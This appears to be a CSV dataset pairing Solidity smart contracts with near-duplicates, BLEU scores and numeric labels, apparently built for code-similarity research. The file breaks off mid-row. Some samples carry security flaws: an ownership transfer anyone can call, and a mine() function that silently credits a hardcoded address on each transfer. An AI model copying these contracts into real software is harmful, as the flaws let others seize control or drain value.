sni,bleu,code,check,,,,,
"contract MyToken {
        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    }",0.906001261,"contract MomsAvenueToken {
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);
}",1,,,,,
"contract EnviroS is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 


    function EnviroS(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function mine() {
        balances[block.coinbase] += 1; 
        balances[0x4b37c5570C4F08C1985550176cdef48db5b6849D] += 1; 
        totalSupply += 2; 
    }


    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        mine();
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }




  }",0.911333343,"contract KKKKToken{

    uint256 public totalSupply;

    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;

    string public name;
    uint8 public decimals;
    string public symbol;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    constructor(
        uint256 _initialAmount,
        string memory _tokenName,
        uint8 _decimalUnits,
        string memory _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;
        totalSupply = _initialAmount;
        name = _tokenName;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",2,,,,,
contract mortal { address owner; function mortal() { owner = msg.sender; } function kill() { if (msg.sender == owner) selfdestruct(owner); } },0.964084895,"contract mortal
{
    address owner;

    function mortal() { owner = msg.sender; }
    function kill() { if(msg.sender == owner) selfdestruct(owner); }
}",0,,,,,
contract greeter is mortal { string greeting; function greeter(string _greeting) public { greeting = _greeting; } function greet() constant returns (string) { return greeting; } },0.964150062,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}",0,,,,,
"contract MyToken {
string public name;
string public symbol;
uint8 public decimals;
string public standard = 'RNTLcoin 0.1';
uint256 public totalSupply;

mapping (address => uint256) public balanceOf;

event Transfer(address indexed from, address indexed to, uint256 value);

function MyToken(
    uint256 initialSupply, 
    string tokenName, 
    uint8 decimalUnits, 
    string tokenSymbol){
    balanceOf[msg.sender] = initialSupply;              
    name = tokenName;
    symbol = tokenSymbol;
    decimals = decimalUnits;    
    }


function transfer(address _to, uint256 _value) {
    if (balanceOf[msg.sender] < _value) throw;           
    if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
    balanceOf[msg.sender] -= _value;                     
    balanceOf[_to] += _value;                            


} }",0.910154902,"contract Token {

	mapping (address => uint256) public balanceOf;
	
	string public name;
	string public symbol;
	uint8 public decimal; 
	uint256 public totalSupply;
	event Transfer(address indexed from, address indexed to, uint256 value);


	function Token(uint256 initialSupply, string tokenName, string tokenSymbol, uint8 decimalUnits){
		balanceOf[msg.sender] = initialSupply;
		totalSupply = initialSupply;
		decimal = decimalUnits;
		symbol = tokenSymbol;
		name = tokenName;
	}

	function transfer(address _to, uint256 _value){
		if(balanceOf[msg.sender] < _value) revert();
		if(balanceOf[_to] + _value < balanceOf[_to]) revert();
		

		balanceOf[msg.sender] -= _value;
		balanceOf[_to] += _value;
		Transfer(msg.sender, _to, _value);
	}

}",3,,,,,
"contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}",0.970579749,"contract Owned {

    address public owner;

    address public newOwner;



    event OwnershipTransferred(address indexed _from, address indexed _to);



    function Owned() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        newOwner = _newOwner;

    }

    function acceptOwnership() public {

        require(msg.sender == newOwner);

        OwnershipTransferred(owner, newOwner);

        owner = newOwner;

        newOwner = address(0);

    }

}",0,,,,,
"contract EIP20 is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 

    function EIP20(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;               
        totalSupply = _initialAmount;                        
        name = _tokenName;                                   
        decimals = _decimalUnits;                            
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",0.991259909,"contract GChain is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;

    string public name;                   
    uint8 public decimals;                
    string public symbol;                

    function GChain(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;          
        totalSupply = _initialAmount;
        name = _tokenName;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}",0,,,,,
"contract SimpleStorage {
    uint storedData;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint) {
        return storedData;
    }
}",0.904909624,"contract DappTutorial {
  uint storedData;

  function set(uint x) {
    storedData = x;
  }

  function get() constant returns (uint) {
    return storedData * 2;
  }
}",2,,,,,
"contract Owned {
  address public owner;
  function Owned() public {
    owner = msg.sender;
  }
}",0.900499812,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}",1,,,,,
"contract TestCoin is StandardToken { 


    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           


    function TestCoin() {
        balances[msg.sender] = 1000000000000000000000;               
        totalSupply = 1000000000000000000000;                        
        name = ""TestCoin"";                                   
        decimals = 18;                                               
        symbol = ""TCN"";                                             
        unitsOneEthCanBuy = 10;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (balances[fundsWallet] < amount) {
            return;
        }

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.965440696,"contract CR7 is StandardToken { 



    



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                 

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;           



    

    

    function CR7() {

        balances[msg.sender] = 1000000000000000000000000;               

        totalSupply = 1000000000000000000000000;                        

        name = ""CR7_TokenCoin"";                                       

        decimals = 18;                                               

        symbol = ""CR7"";                                             

        unitsOneEthCanBuy = 10;                                      

        fundsWallet = msg.sender;                                    

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",2,,,,,
contract mortal { address owner; function mortal() { owner = msg.sender; } function kill() { if (msg.sender == owner) suicide(owner); } },0.914207915,"contract mortal
{
    address owner;

    function mortal() { owner = msg.sender; }
    function kill() { if(msg.sender == owner) selfdestruct(owner); }
}",1,,,,,
"contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}",0.941479494,"contract Context is Initializable {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}",1,,,,,
"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}",0.978703857,"contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public constant returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",0,,,,,
"contract Ownable {
   address public owner;


   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  function Ownable() public {
owner = msg.sender;
  }

   modifier onlyOwner() {
require(msg.sender == owner);
_;
  }


  function transferOwnership(address newOwner) public onlyOwner {
require(newOwner != address(0));
emit OwnershipTransferred(owner, newOwner);
owner = newOwner;
  }

}",0.957195781,"contract Ownable {

  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  

  constructor() public{

    owner = msg.sender;

  }

  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

  

  function transferOwnership(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }

}",1,,,,,
"contract MyToken is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function MyToken() {
        balances[msg.sender] = 50000000000000000000000000;               
        totalSupply = 50000000000000000000000000;                        
        name = ""MyToken"";                                   
        decimals = 18;                                               
        symbol = ""MT"";                                             
        unitsOneEthCanBuy = 10;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (balances[fundsWallet] < amount) {
            return;
        }

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.964107192,"contract Intex is StandardToken { 



    



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                 

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;           





    

    function Intex() {

        balances[msg.sender] = 500000000000000000000000000;

        totalSupply = 500000000000000000000000000;

        name = ""Intex"";

        decimals = 18;

        symbol = ""INT"";

        unitsOneEthCanBuy = 50000;

        fundsWallet = msg.sender;

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",2,,,,,
"contract Owned {

    address public owner;

    address public newOwner;


    event OwnershipTransferred(address indexed _from, address indexed _to);


    function constructor() public {

        owner = msg.sender;

    }


    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }


    function transferOwnership(address _newOwner) public onlyOwner {

        newOwner = _newOwner;

    }

    function acceptOwnership() public {

        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

        newOwner = address(0);

    }

}",0.977657034,"contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}",,1,,,,
"contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}",0.970705494,"contract ERC20Basic {

  uint256 public totalSupply;

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}",1,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}",0.98412732,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}",1,,,,,
"contract SeedsToken is StandardToken {

  string public name = 'SeedsToken';
  string public symbol = 'SEEDS';
  uint public decimals = 10;
  uint public INITIAL_SUPPLY = 10000000000000000000;

  function SeedsToken() {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

}",0.901376002,"contract BlocksToken is StandardToken {

    string public name = ""Blocks"";
    string public symbol = ""BLOX"";
    uint public decimals = 15;
    uint public INITIAL_SUPPLY = 100000000000000000000000; 

    function BlocksToken() {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract owned {
    address public owner;

    function owned() public{
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public {
        owner = newOwner;
    }
}",0.924333568,"contract owned {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",3,,,,,
"contract tokenRecipient {
    event receivedEther(address sender, uint amount);
    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData)public{
        Token t = Token(_token);
        require(t.transferFrom(_from, this, _value));
        receivedTokens(_from, _value, _token, _extraData);
    }

    function () public payable {
        receivedEther(msg.sender, msg.value);
    }
}",0.98916885,"contract tokenRecipient {
    event receivedEther(address sender, uint amount);
    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
        Token t = Token(_token);
        require(t.transferFrom(_from, this, _value));
        receivedTokens(_from, _value, _token, _extraData);
    }

    function () payable  public {
        receivedEther(msg.sender, msg.value);
    }
}",0,,,,,
"contract Token {
    mapping (address => uint256) public balanceOf;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}",0.967409875,"contract TokenERC20 {
    mapping (address => uint256) public balanceOf;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}",0,,,,,
"contract Token {

    
    function totalSupply() constant public returns (uint256 supply) {}

    
    
    function balanceOf(address _owner) constant public returns (uint256 balance) {}

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success) {}

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success) {}

    
    
    
    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",0.958125147,"contract Token {
  
  function totalSupply() constant returns (uint256 supply) {}

  
  
  function balanceOf(address _owner) constant returns (uint256 balance) {}

  
  
  
  
  function transfer(address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  
  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

  
  
  
  
  function approve(address _spender, uint256 _value) returns (bool success) {}

  
  
  
  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

  event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  uint public decimals;
  string public name = ""black"";
}",2,*,,,,
"contract StandardToken is Token {

    function transfer(address _to, uint256 _value) public returns (bool success) {
        
        
        
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant public returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",0.963745162,"contract StandardToken is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {

        if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else {return false;}
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else {return false;}
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",0,,,,,
"contract MatoxToken is ERC20 {

    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    

    string public constant name = ""Matox"";
    string public constant symbol = ""MAT"";
    uint public constant decimals = 8;

    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed = 0;    
    uint256 public constant MIN_CONTRIBUTION = 1 ether /100; 
    uint256 public tokensPerEth = 50000e8;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);
    event DistrFinished();

    event Airdrop(address indexed _owner, uint _amount, uint _balance);

    event TokensPerEthUpdated(uint _tokensPerEth);

    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;

    modifier canDistr() {
        require(!distributionFinished);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


    function MatoxToken () public {
        owner = msg.sender;    
        distr(owner, totalDistributed);
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }


    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);

        return true;
    }

    function doAirdrop(address _participant, uint _amount) internal {

        require( _amount > 0 );      

        require( totalDistributed < totalSupply );

        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        
        emit Airdrop(_participant, _amount, balances[_participant]);
        emit Transfer(address(0), _participant, _amount);
    }

    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }

    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }

    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }

    function () external payable {
        getTokens();
     }

    function getTokens() payable canDistr  public {
        uint256 tokens = 0;

        
        require( msg.value >= MIN_CONTRIBUTION );

        require( msg.value > 0 );

        
        tokens = tokensPerEth.mul(msg.value) / 0.01 ether;        
        address investor = msg.sender;

        if (tokens > 0) {
            distr(investor, tokens);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }

    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }

    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        
        

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}",0.994370755,"contract RetengoToken is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;    



    string public constant name = ""Retengo"";

    string public constant symbol = ""REG"";

    uint public constant decimals = 8;

    

    uint256 public totalSupply = 5000000000e8;

    uint256 public totalDistributed = 0;    

    uint256 public constant MIN_CONTRIBUTION = 1 ether /100; 

    uint256 public tokensPerEth = 300000e8;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();



    event Airdrop(address indexed _owner, uint _amount, uint _balance);



    event TokensPerEthUpdated(uint _tokensPerEth);

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    

    function RetengoToken () public {

        owner = msg.sender;    

        distr(owner, totalDistributed);

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);        

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function doAirdrop(address _participant, uint _amount) internal {



        require( _amount > 0 );      



        require( totalDistributed < totalSupply );

        

